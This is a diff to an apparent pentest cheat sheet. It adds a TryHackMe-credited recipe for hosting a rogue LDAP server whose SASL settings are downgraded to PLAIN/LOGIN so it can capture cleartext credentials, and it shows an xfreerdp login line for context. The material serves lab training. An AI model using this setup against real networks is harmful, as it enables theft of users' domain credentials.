@@ -239,5 +239,41 @@ xfreerdp /v:[IP-ADDRESS] /u:[USERNAME] /p:[PASSWORD] /cert:ignore
 
 *********************************************************************************
 
+## Host Rogue LDAP Server
+
+1st:
+```
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+```
+2nd:
+```
+sudo dpkg-reconfigure -p low slapd
+```
+3rd: Create file with these contents:
+```
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+4th:
+```
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+```
+5th (Verify it is working):
+```
+ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+```
+The command should return:
+```
+dn:
+supportedSASLMechanisms: PLAIN
+supportedSASLMechanisms: LOGIN
+```
+Credit: https://tryhackme.com/room/breachingad
+
+*********************************************************************************
+
 ## References
 * https://tryhackme.com/room/linprivesc
+* https://tryhackme.com/room/breachingad
